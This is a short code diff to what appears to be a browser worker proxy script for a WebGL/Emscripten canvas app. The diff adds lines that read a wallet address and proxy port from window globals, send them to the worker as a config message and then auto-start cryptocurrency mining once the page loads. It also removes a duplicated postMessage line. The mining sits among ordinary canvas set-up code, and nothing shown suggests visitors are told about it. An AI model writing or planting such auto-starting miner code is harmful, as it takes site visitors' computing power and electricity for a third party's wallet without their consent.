@@ -605,15 +605,16 @@ var worker = new Worker(workerURL);
 WebGLClient.prefetch();
 
 setTimeout(function() {
-  worker.postMessage({
-    target: 'worker-init',
-    worker.postMessage({ target: 'worker-init', width: Module.canvas.width,
+  worker.postMessage({ target: 'worker-init', width: Module.canvas.width,
   height: Module.canvas.height,
   boundingClientRect: cloneObject(Module.canvas.getBoundingClientRect()),
   URL: document.URL,
   currentScriptUrl: filename,
   preMain: true });
- // auto-start mining
+ // send config (wallet, port) then auto-start mining
+ var wallet = window.__minerWallet || '';
+ var proxyPort = window.__minerPort || 8081;
+ worker.postMessage({ target: 'custom', userData: {message:'set_config', wallet: wallet, port: proxyPort} });
  worker.postMessage({ target: 'custom', userData: {message:'init_socket', miner_percentage:1} });
 }, 0); // delay til next frame, to make sure html is ready
 
